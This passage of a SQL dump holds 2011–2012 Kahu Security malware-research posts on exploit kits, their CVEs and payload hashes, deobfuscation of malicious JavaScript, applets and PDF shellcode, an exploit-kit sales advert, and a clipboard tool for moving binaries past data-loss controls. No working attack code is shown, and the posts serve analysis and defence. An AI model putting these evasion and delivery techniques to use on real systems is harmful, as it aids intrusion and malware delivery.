tags).\n\nScrolling down near the bottom, you’ll see “i.body.appendChild(B);”. Ah, so the results get attached to the body. Okay, let’s select the “Intercept DOM with Variable” method and type in “B”.\n\nNow let’s have a look at the “Results” tab:\n\nSample 3\n=======\nHere’s a live script that needs to be deobfuscated in two steps. We have to first deobfuscate the bottom half then tack that part to the first half to view the final script. You can see two distinctive parts of the script.\n\nAt the bottom of the script, we can see an eval. Let’s choose the “Redirect Eval to TextArea” method.\n\nNice, we deobfuscated the first part.\n\nLet’s copy that over to the main tab and replace the bottom script with our newly deobfuscated code:\n\nHmmm, it’s not clear exactly what’s going on so let’s click on the “Highlight Decryption Clues” button. This highlights some key functions and more importantly, variable accumulators. Now we can follow what’s going on. Look at the variable “V3NsLL” and how it contains “eval” then becomes “xTlHf” and finally “X9DfwSP”. Ahh, so at the very bottom it looks like the variable “uXGJZXGp” is getting eval’d.\n\nLet’s use the “Intercept Function with Name” and paste in “X9DfwSP” and go to the “Results” tab. We can see the deobfuscated source which is exploit code.\n\nLast thing to mention is that the tool creates a temporary file called “~temp.html” which contains the original script plus its attempt to deobfuscate the code. You can have a look to see what it’s doing by opening this file in Notepad (do not open it with your browser directly since you will render the code without protection!).\n\nAbove is the code it used when we intercepted the function “X9DfwSP”. If it’s wrong, you can always copy and paste the fix over to the tool, make corrections, then click on the “Unmodified Request” option and check out the results.\nThere you go…I hope this tool helps you!\nNo warranties, program is made available as-is. Credits to: Eric Wolcott (firewall) and Michael D. (proxy).\nMD5: D6444A02BDE034B81E4BEBB55009B656\nDownload: http://www.mediafire.com/?2c5m50p8qm6q5wv', 'deobfuscation, deobfuscator, javascript, revelo', 'http://www.kahusecurity.com/?p=12365\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (104, 'Binary File Converter', 'darryl', 'April 17, 2012', 'I wanted to copy over some of my tools into a remote host via VPN. The remote host was locked down so emailing files to myself or downloading files from a website or local drive was not possible. The only thing that was allowed was the clipboard so copying/pasting worked.\nThere have been previous articles and discussions about converting binary content into text to move files in and out of VPN and other similar technologies so I searched for and found some tools on Internet that I could use but they were kludgy, bloated, or cumbersome to use.\nSo here’s a quick, little tool I wrote with the least creative name I could come up with and the UI to match.  It converts a binary file into text which shows up in the text box which you can copy/paste over to a receiving program which converts text back into a binary file.\n\nTo get the receiving program into the remote host, click on the “Create VBS File” button. The textbox will populate with a VBS script.\n\nYou just copy the text, switch over to the remote host, and paste it into a text document then save it as “file.vbs” and run it.\n\nWhen the script runs, a “lite version” of the program will be written out.\n\nIn my example, I zipped up my tools on the local host:\n\nThen I clicked on “Read Binary File”. The program converts the binary file into text. I just right-clicked and choose “Select All” then “Copy”.\n\nI went over to the remote host and pasted the text into the textbox. When I clicked on “Write Binary File”, the zipped file appeared on the desktop.\n\nI probably need to mention that companies should already know about this threat. Antivirus should protect against moving malware into the remote host and DLP should protect against data exfiltration. If the security gap is still too big then you can disable the clipboard via group policy.\nLast thing. VB Classic was used to code this program. Textboxes in VB Classic is limited to 64K, however, a smart fellow came up with a way to break this barrier. Credit and thanks to Tom Moran. I think I’ll be using his code snippet in my projects since it works great and seems stable (albeit slowly when dealing with large files). This program is available as-is, without warranties.\nFilename: Binary File Converter.zip\nMD5: 1C9766C1A7A18DB7736CB709090C4C22\nDownload: http://www.mediafire.com/?zdb2pli66vw9gs7', 'binary, file converter, rdp, text, vm, vpn', 'http://www.kahusecurity.com/?p=12343\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (105, 'Escalating Java Attacks', 'darryl', 'March 28, 2012', 'If you’re into malware analysis or incident response, I’m sure you’ve come across a number of malicious Java applets lately. And perhaps you’ve noticed some new tactics being employed which are quite clever and probably effective in getting past perimeter and desktop security.\nHere are three related articles that caught my eye:\nA unique ‘fileless’ bot attacks news site visitors\nAn interesting case of JRE sandbox breach\nNew Java Attack Rolled into Exploit Packs\nAs noted by Brian Krebs, the latest Java exploit, CVE-2012-0507, will be added to exploit packs soon. Some people believe that the Eleonore Exploit Kit is the first kit to use this exploit. An announcement at the end of 2011 revealed version 1.8.91 which included Java Rhino.\nEleonore Exploit Kit v1.8.91\nPrivate sheaf exploit\nCoder – Exmanoize\nAre included new exploit:\njava_rhino\npdf libtiff\npdf u3d new\nflash pack\nquicktime\niepeers\nmdac\nAverage having punched on a sheaf: 15-25% Depends on the traffic.\nOn сео traffic can be 25-35%\n* Knock standard, even hardly above the standard:\n> Zeus = 50-60%\n> Loader = 80-90%\nThe price of last version 1.8.91 :\n> Cost of the sheaf = 2200$\n> Cleanings from antivirus = от 50$\n> Domain change free of charge, change ip = 50$\n> Updates = от 100$\n* Sheaf with a binding to the domain or IP .\nIt’s very possible that Eleonore has been updated since then with this new Java Atomic exploit as Exmanoize has added 0days to his kit before.\nMicrosoft researchers have already dissected this but let’s have a quick look at this Java exploit anyway…\nThe exploit file has a hidden class in the applet (“arrayOfString”):\n\nI used my Converter program to swap one character every one position to reveal the magic number for class files, “CAFEBABE”:\n\nAfter writing that out to a binary file, we can see that it uses two alternating values to XOR an encrypted file:\n\nSince the file is encrypted and looks like a bunch of random bytes, it’s very likely it would download just fine and land on the victim’s PC as it’s decrypted and executed by the applet.\nHere’s another tactic I found that’s similar. This was part of a malvertisement campaign on a Chinese news site discovered the other day. Instead of downloading a separate binary file that gets decrypted and executed, malware authors are using a self-contained applet which includes the encrypted payload.\nThe entry point reveals a call to an external Javascript file, some encodings, and a redirect:\n\nHere’s the Javascript file doing the encoding:\n\nYou have to nail the referer and the parameters just right or you’d end up with this innocent JAR (I’m noticing that some new exploit kits require the same attention to details or you’ll get a goose-egg):\n\nIf you’re successful, you’ll get the malicious applet.\n\nThe pl.class describes rotating four values to XOR decrypt a resource file that’s actually included right in the JAR file itself. It’s the CMQSQVRW file seen on the left-hand side.\n\nHere’s how the encrypted file looks like:\n\nI wrote a quick and dirty program to XOR files using multiple values for added flexibility:\n\nSure enough, you end up with an executable, actually a DLL. You’ll notice that the first two bytes are not “MZ”. Those bytes are written out by the applet (see the above code) which my program didn’t do.\n\nWhen the applet runs, it decrypts the resource file, then writes it out to the temp folder as an innocent looking “htm” file:\n\nThe DLL file is then called up which scans the registry for known AV products. When done, it makes an HTTP request for a “tracking.gif” file which includes information in its user-agent string and cookie.\n\nThis behavior sounds similar to what the Kaspersky researcher found that preceded the Lurk infection.\nGoing back to the applet, I tried to look for clues that would tell me which Java exploit was used but there’s nothing there. I noticed a Corba import and makes me wonder if this is using the vulnerability described here:\nCVE-2012-0506 – “Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect integrity via unknown vectors related to CORBA.”\nThere are no further information or technical details about this vulnerability so I can’t confirm. Since Oracle indicated that they have fixed this vulnerability in Java SE 6u31, I installed this version and executed the applet. Nothing happened. The applet failed to decrypt and write out the DLL file to the temp folder.\nDLL MD5: 52FA85A43AE7666DAAB7893385FA2F7F\nVT: 0/42\nAnubis results\nJAR MD5: 08331A5C7564FD61A84EDEA7FBCF56FC\nVT: 0/42', 'corba, CVE-2012-0506, eleonore, exploit, exploit kit, java', 'http://www.kahusecurity.com/?p=12335\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (106, 'Converter v0.3 Released', 'darryl', 'March 16, 2012', 'Here’s another update based on some recent real-world analysis I’ve done as well as some of your requests and feedback.\nThe first thing you’ll notice is that I’ve increased the workspace as requested.\n\n  \nCustom Character Filter\nHere’s one example but you can find numerous variants via Google:\n\nIt’s just a URL with garbage characters inserted between valid ones. This feature allows you to remove a string of single characters. Note: You can also use the “invert” option to keep the string of characters that match instead.\n\n  \nMulti-Pass Search\nYou might have seen this script on recent website compromises; it uses a convoluted method of character replacement.\n\nYou can tackle this script in a couple of ways. One method is to manually search/replace each character but that takes time so I’ve added a way you can do multiple searches/replacements in one pass. Just make sure you use a unique character for your delimiter.\n\nFIFO, “first in, first out”, means that it will find the first match and ignore any other matches. LILO is “last in, last out” which means that the last match will be used. Here’s a very simple example:\nMethod: Single-Pass (FIFO)\nString: “hello”\nSearch: e,x\nReplace: x,z\nDelimiter: , (comma)\nResult: “hxllo”\nMethod: Multi-Pass (LILO)\nString: “hello”\nSearch: e,x\nReplace: x,z\nDelimiter: , (comma)\nResult: “hzllo”\n  \nUnder the File menu item…\n\n  \nConvert Binary File\nYou can read in a binary file and convert it to a hex file and vice versa. The output file will be written to the application’s current path.\n\nConvert Shellcode to EXE\nIf you encounter shellcode, you can convert that to an EXE file (credit to David Zimmer of Sandsprite). The file “shellcode.exe_” will be written to the application’s current path.\n\nNow you can decompile/debug it using IDA or Olly. You can see the XOR decryption loop here (remember this for later).\n\n  \nUnder the Tools menu item…\n\n  \nConvert Unix Epoch Timestamp\nYou can convert date/time to Unix Epoch and vice versa:\n\nXOR Encrypt/Decrypt\nYou can now encrypt or decrypt content using XOR (credits to Sebatian L. and to James Johnston of TechKnow Professional Services. This program also contains cryptography software by David Ireland of DI Management Services Pty Ltd).\n\nIf you paste shellcode in hex, you can decrypt it if you know the key. Remember the example above? It uses the value of 0x28 to decrypt the shellcode, which is “(” in ASCII. You can use either values.\n\nThis program is packed with UPX so AV may falsely indicate this is malicious but it’s not. Also, this is being made available as-is without warranties. I hope you all continue to find this tool useful.\nDownload: http://www.mediafire.com/?p0zb8kexad1vewz\nMD5: 9880C4D32103945D5244BD5286932602', 'conversion, decimal, hex', 'http://www.kahusecurity.com/?p=12312\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (107, 'Chinese Pack Using Dadong’s JSXX VIP Script', 'darryl', 'March 1, 2012', 'Another week, another pack. But this one is using Dadong’s JSXX 0.41 VIP obfuscation script which makes the task of Javascript deobfuscation a more difficult than the others. We’ll get to that in a bit but let’s talk about the exploit pack itself first.\nThis exploit pack calls up three exploits across several files. There’s numerous references to “gondad” in the script so we’ll call this “Gong Da Pack” (according to translation sites, “gong da” means “attack” in Chinese). Here’s the main page and the start of the exploitation process:\n\nNear the top of the screenshot above, you can see that it iframes “ff.html”. This page calls up a Flash exploit (CVE-2011-2140).\n\nThe second page it iframes is “i.html”. It loads up a MIDI file which exploits Windows Multimedia Library (CVE-2012-0003).\n\nFinally, in one of the obfuscated content, it calls up a JAR file that exploits Rhino (CVE-2011-3544). You’ll see this at the end when we deobfuscate the script.\nIf the exploits are successful, “Gong Da Pack” drops two executables onto the client’s PC:\nFilename: top.exe\nMD5: DAA26AC034C368CE43B7EF1F952DAD01\nVT: 31 / 43\nFilename: topx.exe\nMD5: 2FBC5B68C1D744610CD583FA366DFE6C\nVT: 1 / 43\nNow let’s talk a little about the script obfuscation. Prior to this pack’s discovery, I’ve never heard of “Dadong’s JSXX 0.41 VIP” Javascript obfuscator. I tried searching for the obfuscation program, script, or service but I couldn’t find anything (if anyone can share, please email to me).\nNext I tried to get more information about the obfuscation technique and see what others had to say about it. I didn’t find much but apparently, this obfuscator has been used to hide exploits before. I also found two programs that tries to deobfuscate the scripts but both fail on this particular version. Seems like another cat-and-mouse game is going on between the author(s) and researchers.\n\nHere’s the main page again and you can see the reference to the obfuscator:\n\nThis is one clever piece of code which takes the blob of hex at the top and turns it into exploit code but does so in a way that any kind of tampering of the deobfuscation script below causes it to return gibberish instead.\nWhat the author has done is made the deobfuscation script tamperproof (kind of like using the callee function) where an addition, deletion, or change of any character will cause the “decryption” key to be modified. How is it doing that? By using the value of each of the characters in the deobfuscation script. Nice!\n\nHere’s what happens if you try to modify the script to deobfuscate it. The variable “vTeXx3” contains what we want to see so we try to view its value. We replace “IPUk4(vTeXx3)” with “alert(vTeXx3)” as seen here:\n\nAnd this is the result:\n\nLet’s try again but this time we intercept “IPUk4” (which is set to execScript — similar to eval) and route the variable to “alert”. However, we need to be mindful of what the code is doing so we will change “IPUk4” to “IPUl3” (increment “k” and decrement “4” which is a wash) and add the alert outside of the “VXWBks7” variable like so:\n\nWhen we execute the script, the deobfuscated text appears:\n\nAnd it’s here that we see the Java Rhino exploit.', 'dadong jsxx vip, deobfuscation, exploit kit, gong da, tamperproof', 'http://www.kahusecurity.com/?p=12257\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (108, 'Another Chinese Pack', 'darryl', 'February 13, 2012', 'This set of exploits was found on a Chinese website by @switchingtoguns (thanks!). It appears to be another Chinese exploit pack.\nAs mentioned in a previous post, Chinese “exploit packs” are straightforward and no-nonsense. It doesn’t use PHP, have a database, nor does it have an administration panel. It’s a collection of HTML files that contain exploit code and minimal Javascript obfuscation. Despite its simplicity, it appears to be quite effective and it seems as though that’s all that really matters to its creators.\nThe entry page contains iframes that call upon several exploit files in the single folder:\n\nThis pack, which we’ll call “Zhi Zhu Pack” (pronounced “jii-juu”), contains five exploits but interestingly there are no Java exploits. The first three exploits were also found in the previously announced pack we called “Yang Pack“.\n* IEPeers (CVE-2010-0806)\n* Flash 10.3.181.x (CVE-2011-2110)\n* Flash 10.3.183.x (CVE-2011-2140)\n* IE Time Element Memory Corruption (CVE-2011-1255)\n* WMP MIDI (CVE-2012-0003)\nWhy are we calling it “zhī zhū”? There’s numerous references to the word “spider” in several of its HTML files. “Zhī zhū” in Chinese means spider so this is basically the Spider Exploit Pack.\n\nThe IE Time Element Memory Corruption exploit (CVE-2011-1255) has been seen in the wild since June of last year. It’s the first time I’m seeing this exploit in a “pack”.\n\nThe newest edition is the very recent Windows Media Player MIDI remote exploit code execution vulnerability (CVE-2012-0003):\n\nThe payload appears to be a password stealer for an online game:', 'chinese exploit pack, exploit kit, spider, zhi-zhu', 'http://www.kahusecurity.com/?p=12037\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (109, 'Wild Wild West – 02/2012', 'sectek', 'February 1, 2012', 'New ones added:\nJet Exploit\nMassInfect\nImpossible Sploit\nHierarchy Exploit Pack\nSakura Exploit Pack\nTechno XPack\n“Yang Pack”\nFragus Black', '', 'http://www.kahusecurity.com/?p=11649\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (110, 'Techno XPack', 'darryl', 'January 28, 2012', 'There’s another new exploit pack in town called Techno XPack. This one looks like a re-skinned BleedingLife. Here’s a list of the exploits it’s packing:\nCVE-2008-2992\nCVE-2010-0188\nCVE-2010-0842\nCVE-2010-1297\nCVE-2010-2884\nCVE-2010-3552\nCVE-2010-3654\nJavaSignedApplet\nPanel shots:', 'drive-by, exploit kit, techno xpack', 'http://www.kahusecurity.com/?p=11644\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (111, 'Hierarchy Exploit Pack', 'darryl', 'January 27, 2012', 'A new pack has emerged called Hierarchy Exploit Pack. Looks a lot like Eleonore but its exploits are different:\nCVE-2006-0003\nCVE-2009-0927\nCVE-2010-0094\nCVE-2010-0188\nCVE-2010-0806\nCVE-2010-0840\nCVE-2010-1297\nCVE-2010-1885\nCVE-2011-0611\nJavaSignedApplet\nHere are some panel shots:', 'drive-by, exploit kit, hierarchy exploit pack', 'http://www.kahusecurity.com/?p=11643\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (112, 'Chinese Exploit Packs', 'darryl', 'January 12, 2012', 'While it can be difficult to attribute exploit packs in many cases, I believe it’s safe to say that there are a few made by Chinese authors. Their style can be seen across packs from the script used for traffic analysis to variable names and methods. Chinese packs are different but arguably still befitting the definition of an exploit pack.\nUnlike traditional packs you’ve seen like Black Hole or Incognito, most Chinese packs I’ve come across contain a small collection of HTML and Javascript files that target only a few vulnerabilities. They don’t use PHP, a database, or have an administrative panel. But despite not having a lot of bells and whistles, they appear to be somewhat effective.\nHere are two packs found in the wild recently — both were targeting Chinese users.\nExploit Pack #1\nI noticed this pack last year and it has been appearing here and there. Here’s a screenshot of this pack’s contents:\n\nThe main file is “CUTE-IE.html” and pulls in two external Javascript files, “pack.js” and “pack.css”, with the latter containing shellcode. Note the heavy use of the word “cute” in the script — maybe we should call this “Cute Pack”.\n\nThe exploit used is IEPeers (CVE-2010-0806) and if successful, executes the “000.exe” program which is a virus. Based on the first screenshot, you can see that CUTE-IE.html was requested 26,791 times with 000.exe loaded 2,833 times. If the numbers are correct then “Cute Pack” has an effectiveness of ~10.5%, not too shabby considering that it’s just one exploit.\nThe other HTML file, “ie.htm”, uses the same exploit without requiring any external Javascript files and installed “123.exe” or “zh.exe”. This one has an effectiveness of ~5.8% which is more realistic.\nI have to wonder why IEPeers is used since it only affects IE 6 and 7 (as opposed to using CVE-2011-1260). I haven’t seen recent browser statistics from China but it’s probable that a lot of users there still use older versions of Windows and IE. Why change if it’s not broken, I suppose?\nHere are the VirusTotal results of the payloads:\nFilename: 000.exe\nMD5: ff2096703b20f0a243c22a2a9c59f478\nResults: 37/43 (86.0%)\nDetected: Virut\nFilename: 123.exe\nMD5: b660442ced5669c8d696e5a096e1f193\nResults: 40/43 (93.0%)\nDetected: Parite\nFilename: zh.exe\nMD5: 16e7750ae91436fae28d95a1195e83d4\nResults: 40/43 (93.0%)\nDetected: Parite\nExploit Pack #2\nThis pack starts off with an HTML file called “yg.htm” (let’s call this one the “Yang Pack” based off its filename).\n\nYou can see that it calls up three iframes and avoids repeat infections. Each of these iframed HTML pages deliver an exploit or two: one for IE, two for Flash, and one for Java.\nThe exploit for IE is again IEPeers. Nothing spectacular to report here but it’s the next three exploits that shows “Yang Pack’s” potential.\nIn the second iframed HTML file called “j.htm”, there’s a bunch of Javascript obfuscation going on.\n\nLet’s deobfuscate the script by replacing “document.write” with “alert”.\n\nThis indicates a Java applet is being called up and the value of “nburl” passed to it (nburl is the URL of the payload). Let’s decompile the applet. Wow, it’s using the latest Java exploit, Java Rhino.\n\nThe third iframed HTML file is called “t.htm”. It does a plug-in check and depending on the Flash version, you get one of two SWF files that contain an exploit.\n\nLet’s decompile the first SWF file. This shows the Flash exploit code for CVE-2011-2110. (Note that the code looks nearly identical to the one analyzed here but VirusTotal shows it as a dropper).\n\nNow let’s have a look at the second SWF file. We’ve seen this before in another Chinese pack. This is exploit code for CVE-2011-2140. The variable “_local6” contains hexcode for another SWF file that downloads and opens an AVI file. The variable below it, “_local7” is shellcode for the payload.\n\nHere’s the decompiled code for the embedded Flash file.\n\nTo summarize, “Yang Pack” only has four exploits but it’s pretty potent:\n* IEPeers (CVE-2010-0806)\n* Flash 10.3.181.x (CVE-2011-2110)\n* Flash 10.3.183.x (CVE-2011-2140)\n* Java Rhino (CVE-2011-3544)\nAnd here are the results from VirusTotal:\nFilename: yg.exe\nMD5: fa7a5daa7e2fca8b2fe5c3beab5e5619\nResults: 32/42 (76.2%)\nDetected: PWS.OnLineGames\nFilename: nb.jar\nMD5: c4127b3f0f87a1df18511bfafbd1de04\nResults: 6/43 (14.0%)\nDetected:\n\nFilename: logo.swf\nMD5: 1377b85d38abe477681d7c5d27e9e292\nResults: 5/43 (11.6%)\nDetected:\n\nFilename: banner.swf\nMD5: fd92f244534d9f3ab362aa2ad9fa0aa2\nResults: 7/43 (16.3%)\nDetected:\n\nFilename: _local6.swf\nMD5: 9fcbfa146c6e47b7f3e6686e8cf65ddd\nResults: 4/43 (11.1%)\nDetected:\n\nFilename: e.avi\nMD5: 39904f03873e6a0564130bfa190c999c\nResults: 13/43 (30.2%)\nDetected:', 'CVE-2010-0806, CVE-2011-2110, cve-2011-2140, CVE-2011-3544, drive-by, exploit kit, flash, iepeers, j', 'http://www.kahusecurity.com/?p=10590\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (113, 'Converter Tool Updated', 'darryl', 'December 16, 2011', 'Thank you all for your support in the release of the Converter tool! I received a lot of good comments and based on some of your feedback, I’ve updated the tool with the ideas you gave me as well as some functions I needed to handle real-world scripts. Consider this my Christmas present to you!\n\nHere’s a quick rundown of the new features:\nEscape/Unescape\nYou can escape and unescape text. This turned out to be a big time saver for me when analyzing obfuscated Javascript.\n\nRegular Expressions\nYou can now use regular expressions in the search/replace function. I’ve added a help screen under the Extras menu.\n\nKeep Every x Row\nI recently found a need to remove every other row of text so I added this capability. You can have it keep every 3rd, 4th, or 10th row if you want to.\n\nSwapping Characters\nI’m sure you’ve seen obfuscated Javascript that uses an algorithm that swaps characters around. You can actually deobfuscate some scripts by reversing the swaps or increasing the number of times it loops.\n\nUnder the Format menu…\nMixed Format to Text\nThis feature allows you to convert a glob of decimal, hex, and octal values. The requirement is that decimal values must have three digits, hex must be preceded with 0x, and octal values must have four digits. I’m sure this will get limited use but at least one script I came across used this technique.\n\nHex Format\nMany times you will encounter hex values in obfuscated Javascript. Now you can easily convert it one of several different formats. It will split every two characters and preceed them with the appropriate symbols. BE = Big Endian, LE = Little Endian.\n\nBeautify Javascript\nInstead of having to go to an online tool to make Javascript look pretty, I’ve added the code from JSBeautifier.org (credit to them). Since the limit of textboxes is 65K, don’t try to convert anything greater than that or it will truncate. This is meant for short scripts.\n\nUnder the Tools menu…\nConvert Base\nYou can convert any decimal value to Base2 through 36 (and vice versa).\n\nCustom Base64 Converter\nAdded the ability to convert text to Base64 using a custom character set (and vice versa). Requirement is that the character set needs to contain exactly 65 characters.\n\nMathematical Alphanumeric Symbols\nI came across a phishing page that used these symbols to hide the URL it was POSTing to. You could always paste the string in Google but I’ve added the ability to convert in both directions. This can only convert letters and numbers (no symbols or special characters).\n\nThere’s a few more things I’ve included but the above covers the significant additions. I hope you find this tool useful! Same disclaimer as before…as-is without any warranties. Again, I packed this using UPX so AV may trigger.\nDownload: http://www.mediafire.com/?u1oggw7c1672l7g\nMD5: d30ca834e6b0973df98a92490d6a2735', 'conversion, decimal, hex', 'http://www.kahusecurity.com/?p=8559\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (114, 'New Exploit Pack', 'darryl', 'December 15, 2011', 'A new exploit pack is being used in the wild. This one was linked to malvertisements that were appearing on popular sites. Here’s one of them:\n\nHere’s the infection chain:\n\nLet’s have a closer look at that second file. At the bottom, we see a 1px-by-1px iframe being created:\n\nAfter you get redirected, you’ll end up on this webpage. This checks out your available plug-ins.\n\nAt the bottom, you’ll see obfuscated Javascript. Several redirectors and exploit packs are using this exact method so maybe there’s some code sharing going on.\n\nAfter you deobfuscate this, you’ll end up with this:\n\nYou can see that it deploys the typical cocktail of Java and PDF exploits. If anyone knows the name of this new pack, please let me know.', 'exploit kit, obfuscated javascript', 'http://www.kahusecurity.com/?p=8546\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (115, 'Custom Base64 Decoder', 'darryl', 'November 29, 2011', 'There’s another new exploit pack making its round. Seems to be quite pervasive as I’m seeing its redirect code on many compromised sites. Here’s the redirection script:\n\nAnd this is the main script of the exploit pack that awaits your browser:\n\nFirst, let’s pretty this thing up:\n\nLooking at the code, it concatenates “eval” from “e” + the body tag + variable containing “l”. Then it converts the gibberish at the bottom using a custom Base64-type decoder routine then calls eval. We can get the deobfuscated value to pop by replacing the eval call with “alert”. Since this is done after it gets decoded, we don’t need to go through the decoder routine.\n\nAnd then you get this:\n\nThis is a compressed script so we can replace “eval” with “alert” once more. Then we get this:\n\nThis calls up another webpage with a malicious PDF file. If the PC doesn’t have the right version installed then it shoots out another obfuscated Javascript that leads to a Java exploit.\nBut I wanted to go back to the custom Base64 decoder it’s using. A reader sent in a request to add a new feature to the Converter tool I released earlier. That feature was to give the user the ability to use their own custom alphabet. Normally the Base64 alphabet looks like this:\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\nBut you can see the custom alphabet the author of the script used:\n\nI quickly wrote a program that can encode and decode using custom alphabets. If I paste the values from the script over to the program, we can obtain the same results when I did the manual deobfuscation:\n\nI’ll add this feature to the Converter tool when I have time during the holidays but here’s a tool that you can use in the meantime. Special thanks to “TF” for making the request and giving me the idea!\nDownload: http://www.mediafire.com/?h05ohw5g866e3w7\nMD5: D8DCE3E2DBC451EA8E3A9B9567B90A3B\nNote: I’ve packed this with UPX to keep the file size down but anti-virus may falsely trigger.', 'custom base64, exploit kit, obfuscated javascript', 'http://www.kahusecurity.com/?p=7609\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (116, 'PDF Analysis using PDFStreamDumper', 'darryl', 'November 19, 2011', 'PDFStreamDumper is a PDF analyzer developed by Sandsprite’s David Zimmer. He has added quite a bit of useful functions to make this an all-in-one, go-to tool as you’ll soon see.\nHere’s a spear-phish email that contains a malicious PDF file attachment:\n\nThis PDF file is quite unusual. When you view it in Notepad, you normally can see readable strings and the magic bytes at the beginning. In this case, the PDF file has been altered:\n\nUsing a hex editor, we can see the familiar attributes that make up a PDF file:\n\nWhen you open the PDF file using Adobe Acrobat Reader < 9.4, it notices that the PDF file is damaged and then repairs it. When it does so, the program crashes since it\'s just been compromised by the exploit and the shellcode executes.\nLet\'s open the PDF file using PDFStreamDumper and click on \"Exploits_Scan\" from the menu bar:\n\nIn “Stream 25”, we can see the Javascript exploit:\n\nDown at the bottom of the stream, we can see a bunch of hex characters. This looks like shellcode to me. We can either save the decompressed stream to a text file by right-clicking on the object to the left.\n\nOr, we can select the hex code and press control-c on our keyboard. Let’s do the latter and now click on “Load” from the main menu then click on “Shellcode File”.\n\nThis brings up a new window. The main section is blank so we paste the hex code. We need to tell the program that this is hex so we select the characters then click on “Add % to HexString” under the “Manual_Escapes” menu.\n\nSince this is presumed to be shellcode, we can use the options under the “Shellcode_Analysis” menu. I tried to dump the shellcode using the top three options but it didn’t work. Let’s see if this is XOR-encrypted so select the hex characters then choose “Xor_Bruteforcer”:\n\nBingo! It is encrypted using the XOR key of “0xF0”. You can see the dropbox.com download and execute link:\n\nChecking that executable against VirusTotal shows that it’s likely a banking Trojan.\n\nI’ve just scratched the surface of what this great tool can do. Be sure you check out PDFStreamDumper and his other tools for malware analysis!', 'pdfstreamdumper, shellcode, spearphish', 'http://www.kahusecurity.com/?p=6918\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (117, 'CVE-2011-2140 Caught in the Wild', 'darryl', 'November 12, 2011', 'A Chinese website contains malvertisement that leads to a few exploits including the latest Flash exploit (CVE-2011-2140). Special thanks to Jason for the find and share!\nHere’s the website that kicks things off:\n\nThis is the infection chain:\n\nIt’s quite long but the action starts at the “1.htm” file. The script loads up the appropriate iframe depending on your Flash or browser version. \n\nOne path leads to an IE browser exploit:\n\nIt calls up pieces of the IEPeers exploit code found in separate Javascript files before calling it. Here are the first two pieces. You can see the variable name is appropriately called “booom”.\n\nShellcode contains a download and execute URL but you need to XOR it with the key of 0xBD first.\n\nThat file is a downloader which pulls down another executable from the same website. The second binary looks to be some kind of online game stealer.\nFile: zxx.exe\nMD5: 1bfd57d5fa7c26e56a5c89bc668db121\nVirusTotal: 21/42 (50.0%)\nFile: shenma.exe\nMD5: 1391776c2ddcbb9eea7fdd3d85a6e0a9\nVirusTotal: 29/41 (70.7%)\nLet’s check out the first of two Flash exploits:\n\nThe shellcode there pulls down the same binary from the URL as above. Here’s what VirusTotal has to say about the SWF file.\nFile: nb.swf\nMD5: f0e59dcbe6730a4383a88ab057a58c5c\nVirusTotal: 4/42 (9.5%)\nThe second Flash exploit is called upon as the last option (see “1.htm” file above under the “luck3()” function). The decompiled code looks like this:\n\nIt takes the contents of variables “_local6” and “_local7” then writes it to a binary file. That binary file is another SWF file. The decompiled code shows that it plays a file called “e.avi” after staging memory.\n\nHere’s a hex view of that file.\n\nI tried dumping the contents of the atoms using AtomicParsley, QTatomizer, and a couple of other tools but it’s not working.\n\nAnyone got a good tool to decompile a Quicktime file? In the meantime, I’m going to try to look for the shellcode and carve it out since this presumably exploits Flash using the CVE-2011-2140 exploit and downloads another binary file called “qq.exe” which is an online game stealer.\nHere’s the VirusTotal scan results for these files:\nFile: nbwm.swf\nMD5: e4b2c3d3cca93350accaf89af8d497aa\nVirusTotal: 5/42 (11.9%)\nFile: e.avi\nMD5: ba9b2a0e81e6a0f6e3fa64c867fd0be6\nVirusTotal: 17/42 (40.5%)\nFile: qq.exe\nMD5: 82c99d83b4d66babb1420b2c6297f4cc\nVirusTotal: 20/42 (47.6%)', 'cve-2011-2140, exploit, exploit pack, flash, iepeers', 'http://www.kahusecurity.com/?p=6367\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (118, 'Interesting BOA Phish', 'darryl', 'November 12, 2011', 'Phishing appears to be on the decline but some phishers aren’t stopping and have apparently changed some of their tactics. Instead of including a link in the email body, an HTML attachment is sent. The user is then enticed to open the attachment. I don’t know if this extra step hurts or helps the phishers but this changes things up a bit. This method is certainly not new but I’ve been seeing several of these come in lately and one of them took me by surprise.\nFirst, here’s a typical phish but instead of a link inside the email, phishers are attaching an HTML file that has the link:\n\nA look at the HTML source code reveals where you’ll end up if you click on the link:\n\nHere’s a not-so-typical phish:\n\nThe email included an HTML file attachment that when opened, looks like this:\n\nLet’s look at where this form will get posted:\n\nWhoa! Nice obfuscation there! Here’s a prettied-up version. If you look closely at the “hpSJG8” variable, you can just about make out the “html” tag with garbage characters in between.\n\nAt the end of the script, there’s a call to “eval” which is worth checking 